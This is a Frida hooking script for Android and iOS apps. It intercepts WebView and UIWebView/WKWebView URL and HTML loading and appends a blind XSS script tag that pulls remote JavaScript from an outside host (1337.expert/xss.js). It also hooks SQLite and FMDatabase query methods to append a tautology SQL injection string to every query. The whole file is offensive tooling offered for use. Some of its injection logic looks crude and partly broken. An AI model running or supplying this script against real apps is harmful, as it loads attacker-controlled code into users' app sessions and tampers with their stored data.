if (Java.available || ObjC.available) {
    console.log("[*] Starting enhanced Blind XSS, SQLi, and WebView XSS injection script...");

    // === Helper function to inject Blind XSS payload ===
    function injectBlindXSS(value) {
        return value + "<script src='https://1337.expert/xss.js'></script>";
    }

    // === Helper function to inject SQLi payload ===
    function injectSQLi(value) {
        return value + "' OR '1'='1' -- ";
    }

    // === Android Injection Logic ===
    if (Java.available) {
        Java.perform(function () {
            console.log("[*] Android environment detected. Starting Android hooks...");

            // === Hook WebView for XSS Injection ===
            try {
                var WebView = Java.use("android.webkit.WebView");
                WebView.loadUrl.overload("java.lang.String").implementation = function (url) {
                    console.log("[*] Intercepted WebView.loadUrl: " + url);

                    // Inject Blind XSS payload into the URL
                    var modifiedUrl = injectBlindXSS(url);
                    console.log("[*] Injected Blind XSS payload into WebView URL.");
                    return this.loadUrl(modifiedUrl);
                };

                WebView.loadData.overload("java.lang.String", "java.lang.String", "java.lang.String").implementation = function (data, mimeType, encoding) {
                    console.log("[*] Intercepted WebView.loadData with data: " + data);

                    // Inject Blind XSS into HTML content
                    var modifiedData = injectBlindXSS(data);
                    console.log("[*] Injected Blind XSS into WebView content.");
                    return this.loadData(modifiedData, mimeType, encoding);
                };
            } catch (err) {
                console.log("[!] Error hooking WebView: " + err);
            }

            // === Hook SQLiteDatabase for SQL Injection ===
            try {
                var SQLiteDatabase = Java.use("android.database.sqlite.SQLiteDatabase");
                
                // Hook rawQuery method
                SQLiteDatabase.rawQuery.overload("java.lang.String", "[Ljava.lang.String;").implementation = function (sql, selectionArgs) {
                    console.log("[*] Intercepted rawQuery: " + sql);
                    
                    // Inject SQLi payload
                    var modifiedSQL = injectSQLi(sql);
                    console.log("[*] Injected SQLi payload into rawQuery.");
                    return this.rawQuery(modifiedSQL, selectionArgs);
                };

                // Hook execSQL method
                SQLiteDatabase.execSQL.overload("java.lang.String").implementation = function (sql) {
                    console.log("[*] Intercepted execSQL: " + sql);

                    // Inject SQLi payload
                    var modifiedSQL = injectSQLi(sql);
                    console.log("[*] Injected SQLi payload into execSQL.");
                    return this.execSQL(modifiedSQL);
                };
            } catch (err) {
                console.log("[!] Error hooking SQLiteDatabase: " + err);
            }
        });
    }

    // === iOS Injection Logic ===
    if (ObjC.available) {
        console.log("[*] iOS environment detected. Starting iOS hooks...");

        // === Hook UIWebView and WKWebView for XSS Injection ===
        try {
            var UIWebView = ObjC.classes.UIWebView;
            var WKWebView = ObjC.classes.WKWebView;

            // Hook UIWebView's loadRequest
            Interceptor.attach(UIWebView["- loadRequest:"].implementation, {
                onEnter: function (args) {
                    var request = new ObjC.Object(args[2]);
                    var url = request.URL().absoluteString();
                    console.log("[*] Intercepted UIWebView loadRequest: " + url);

                    // Inject Blind XSS into the request URL
                    var modifiedUrl = injectBlindXSS(url);
                    request.setURL_(ObjC.classes.NSURL.URLWithString_(modifiedUrl));
                    console.log("[*] Injected Blind XSS into UIWebView URL.");
                }
            });

            // Hook WKWebView's loadRequest
            Interceptor.attach(WKWebView["- loadRequest:"].implementation, {
                onEnter: function (args) {
                    var request = new ObjC.Object(args[2]);
                    var url = request.URL().absoluteString();
                    console.log("[*] Intercepted WKWebView loadRequest: " + url);

                    // Inject Blind XSS into the request URL
                    var modifiedUrl = injectBlindXSS(url);
                    request.setURL_(ObjC.classes.NSURL.URLWithString_(modifiedUrl));
                    console.log("[*] Injected Blind XSS into WKWebView URL.");
                }
            });

            // Hook WKWebView's loadHTMLString
            Interceptor.attach(WKWebView["- loadHTMLString:baseURL:"].implementation, {
                onEnter: function (args) {
                    var htmlContent = ObjC.Object(args[2]);
                    console.log("[*] Intercepted WKWebView loadHTMLString: " + htmlContent);

                    // Inject Blind XSS into HTML content
                    var modifiedHtmlContent = injectBlindXSS(htmlContent.toString());
                    args[2] = ObjC.classes.NSString.stringWithString_(modifiedHtmlContent);
                    console.log("[*] Injected Blind XSS into WKWebView content.");
                }
            });
        } catch (err) {
            console.log("[!] Error hooking WebView: " + err);
        }

        // === Hook SQLite for SQL Injection ===
        try {
            var FMDatabase = ObjC.classes.FMDatabase;

            // Hook FMDatabase's executeQuery
            Interceptor.attach(FMDatabase["- executeQuery:"].implementation, {
                onEnter: function (args) {
                    var query = ObjC.Object(args[2]).toString();
                    console.log("[*] Intercepted executeQuery: " + query);

                    // Inject SQLi payload into the query
                    var modifiedQuery = injectSQLi(query);
                    args[2] = ObjC.classes.NSString.stringWithString_(modifiedQuery);
                    console.log("[*] Injected SQLi payload into executeQuery.");
                }
            });

            // Hook FMDatabase's executeUpdate
            Interceptor.attach(FMDatabase["- executeUpdate:"].implementation, {
                onEnter: function (args) {
                    var query = ObjC.Object(args[2]).toString();
                    console.log("[*] Intercepted executeUpdate: " + query);

                    // Inject SQLi payload into the query
                    var modifiedQuery = injectSQLi(query);
                    args[2] = ObjC.classes.NSString.stringWithString_(modifiedQuery);
                    console.log("[*] Injected SQLi payload into executeUpdate.");
                }
            });
        } catch (err) {
            console.log("[!] Error hooking FMDatabase: " + err);
        }
    }

    console.log("[*] Enhanced Blind XSS, SQLi, and WebView XSS injection script loaded successfully.");
} else {
    console.error("[-] Neither Java nor ObjC is available!");
}